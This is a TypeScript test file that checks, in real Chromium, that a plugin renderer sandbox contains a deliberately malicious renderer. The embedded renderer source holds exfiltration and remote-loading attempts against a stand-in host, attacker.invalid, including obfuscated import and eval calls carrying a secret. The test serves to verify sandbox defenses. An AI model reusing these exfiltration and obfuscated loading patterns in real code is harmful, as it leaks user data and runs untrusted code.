// @vitest-environment node

import * as http from 'node:http'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { chromium, type Browser } from 'playwright'
import {
  buildCustomRendererSrcdoc,
  CUSTOM_RENDERER_WORKER_BOOTSTRAP,
  customRendererInitEnvelope,
  type CustomRendererIdentityV1,
} from './custom-renderer-bridge'

let browser: Browser | undefined
let server: http.Server | undefined

async function listen(): Promise<{ origin: string }> {
  server = http.createServer((_req, res) => {
    res.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': "default-src 'self'; frame-src 'self' blob: data:; script-src 'self' 'unsafe-inline' blob:; worker-src blob:; style-src 'unsafe-inline'",
    })
    res.end('<!doctype html><html><body><main id="host"></main></body></html>')
  })
  await new Promise<void>(resolve => server!.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  if (!address || typeof address !== 'object') throw new Error('browser harness did not bind')
  return { origin: `http://127.0.0.1:${address.port}` }
}

afterEach(async () => {
  await browser?.close()
  browser = undefined
  if (server?.listening) await new Promise<void>(resolve => server!.close(() => resolve()))
  server = undefined
})

describe('Custom Renderer real Chromium isolation', () => {
  it('contains navigation/network attempts in a Worker and emits Actions only from a real button click', async () => {
    const { origin } = await listen()
    const identity: CustomRendererIdentityV1 = {
      plugin_id: 'com.example.malicious',
      plugin_version: '1.0.0',
      renderer_id: 'malicious-card',
      renderer_digest: 'a'.repeat(64),
      node_id: 'node-malicious',
      node_revision: 1,
    }
    const nonce = 'b'.repeat(48)
    const source = `export async function render(payload) {
      const syncAttempts = [
        () => { location.href = 'https://attacker.invalid/navigation?secret=worker-secret' },
        () => { globalThis.location = 'https://attacker.invalid/global-navigation?secret=worker-secret' },
        () => fetch('https://attacker.invalid/fetch?secret=worker-secret'),
        () => new XMLHttpRequest(),
        () => new WebSocket('wss://attacker.invalid/socket?secret=worker-secret'),
        () => new Worker('https://attacker.invalid/recursive-worker.js'),
        () => importScripts('https://attacker.invalid/classic-loader.js'),
        () => Function("return im" + "port('https://attacker.invalid/obfuscated-module?secret=worker-secret')")(),
        () => (0, eval)("globalThis['fe' + 'tch']('https://attacker.invalid/eval-fetch?secret=worker-secret')"),
        () => postMessage({ forged: true, secret: 'worker-secret' }),
        () => document.body.replaceChildren('escaped'),
      ];
      for (const attempt of syncAttempts) {
        try { await attempt() } catch {}
      }
      return { view_version: 1, root: {
        type: 'box', direction: 'column', gap: 'sm', children: [
          { type: 'text', text: payload.node.content.title, variant: 'title' },
          { type: 'button', label: 'Approve safely', action_id: 'approve', variant: 'primary' },
        ],
      } };
    }`
    const srcdoc = buildCustomRendererSrcdoc({ source, nonce, identity, parent_origin: origin })
    const init = customRendererInitEnvelope(identity, nonce, {
      node: {
        id: identity.node_id,
        revision: identity.node_revision,
        content: { title: 'Worker-rendered safe view' },
      },
      placement: { node_id: identity.node_id },
      context: { device: 'desktop' },
    } as never, ['approve'])

    const executablePath = [
      process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH,
      process.env.CHROME_BIN,
      path.join(os.homedir(), '.local/bin/google-chrome'),
      '/usr/bin/google-chrome',
      '/usr/bin/chromium',
    ].find(candidate => candidate && fs.existsSync(candidate))
    browser = await chromium.launch({ headless: true, ...(executablePath ? { executablePath } : {}) })
    const context = await browser.newContext()
    const page = await context.newPage()
    const leakedRequests: string[] = []
    const navigations: string[] = []
    const consoleMessages: string[] = []
    page.on('request', request => {
      if (request.url().includes('attacker.invalid')) leakedRequests.push(request.url())
    })
    page.on('framenavigated', frame => navigations.push(frame.url()))
    page.on('console', message => consoleMessages.push(`${message.type()}: ${message.text()}`))
    await page.goto(origin, { waitUntil: 'domcontentloaded' })
    const bootstrapProbe = await page.evaluate(({ bootstrap, probeIdentity, probeNonce }) => new Promise<string>((resolve) => {
      const url = URL.createObjectURL(new Blob([bootstrap], { type: 'text/javascript' }))
      const worker = new Worker(url, { type: 'module' })
      const finish = (value: string) => {
        worker.terminate()
        URL.revokeObjectURL(url)
        resolve(value)
      }
      worker.addEventListener('message', event => finish(String(event.data?.type || 'unknown-message')))
      worker.addEventListener('error', event => finish(`error:${event.message}`))
      worker.postMessage({
        worker_protocol: 1,
        type: 'homerail.custom-renderer.worker.configure',
        nonce: probeNonce,
        identity: probeIdentity,
        source: 'export function render(payload) { return { view_version: 1, root: { type: "text", text: String(payload?.node?.id || "probe") } } }',
      })
      setTimeout(() => finish('timeout'), 2_000)
    }), { bootstrap: CUSTOM_RENDERER_WORKER_BOOTSTRAP, probeIdentity: identity, probeNonce: nonce })
    expect(bootstrapProbe).toBe('homerail.custom-renderer.worker.ready')
    await page.evaluate(({ frameSource, envelope }) => {
      const messages: unknown[] = []
      Object.defineProperty(window, '__customRendererMessages', { value: messages, configurable: true })
      window.addEventListener('message', event => messages.push(event.data))
      const frame = document.createElement('iframe')
      frame.id = 'custom-renderer'
      frame.setAttribute('sandbox', 'allow-scripts allow-same-origin')
      frame.setAttribute('credentialless', '')
      frame.setAttribute('referrerpolicy', 'no-referrer')
      frame.addEventListener('load', () => frame.contentWindow?.postMessage(envelope, window.location.origin), { once: true })
      frame.srcdoc = frameSource
      document.querySelector('#host')?.append(frame)
    }, { frameSource: srcdoc, envelope: init })

    const frameElement = page.locator('#custom-renderer')
    const renderer = frameElement.contentFrame()
    try {
      await renderer.getByText('Worker-rendered safe view', { exact: true }).waitFor({ timeout: 10_000 })
    } catch (cause) {
      const messages = await page.evaluate(() => (window as any).__customRendererMessages)
      const content = await renderer.locator('html').innerHTML().catch(() => '(frame unavailable)')
      throw new Error(`Renderer did not produce a view: messages=${JSON.stringify(messages)} console=${JSON.stringify(consoleMessages)} content=${content}`, { cause })
    }
    const button = renderer.getByRole('button', { name: 'Approve safely' })
    await button.waitFor()

    // HTMLElement.click() is synthetic and must not cross the parent Action bridge.
    await button.evaluate(element => (element as HTMLButtonElement).click())
    await page.waitForTimeout(100)
    expect(await page.evaluate(() => (window as any).__customRendererMessages
      .filter((message: any) => message?.type === 'homerail.custom-renderer.action').length)).toBe(0)

    await button.click()
    await page.waitForFunction(() => (window as any).__customRendererMessages
      .some((message: any) => message?.type === 'homerail.custom-renderer.action'))
    const actions = await page.evaluate(() => (window as any).__customRendererMessages
      .filter((message: any) => message?.type === 'homerail.custom-renderer.action'))
    expect(actions).toEqual([expect.objectContaining({
      nonce,
      plugin_id: identity.plugin_id,
      renderer_id: identity.renderer_id,
      node_id: identity.node_id,
      action_id: 'approve',
    })])

    await page.waitForTimeout(250)
    expect(page.url()).toBe(`${origin}/`)
    expect(await frameElement.getAttribute('src')).toBeNull()
    expect(page.frames().some(frame => frame.url().includes('attacker.invalid'))).toBe(false)
    expect(navigations.some(url => url.includes('attacker.invalid'))).toBe(false)
    expect(leakedRequests).toEqual([])
  }, 45_000)
})
